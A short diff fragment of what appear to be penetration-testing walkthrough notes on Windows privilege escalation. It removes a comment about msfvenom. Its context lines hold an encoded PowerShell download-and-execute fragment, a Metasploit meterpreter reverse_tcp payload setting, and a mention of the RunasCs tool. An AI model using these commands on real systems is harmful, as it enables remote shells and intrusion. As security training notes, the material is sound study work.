@@ -723,7 +723,6 @@ SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A
     set payload windows/x64/meterpreter/reverse_tcp
     run
     #+end_src
-    we don't really need to generate an exe with msfvenom for this i guess.
     anyway, in the session generated thus, we do not have the =SeDebugPrivilege= -- because 
     we're still basically within that powershell session. so he uses a new tool - [[https://github.com/antonioCoco/RunasCs][RunasCs]]
 ** RunasCs
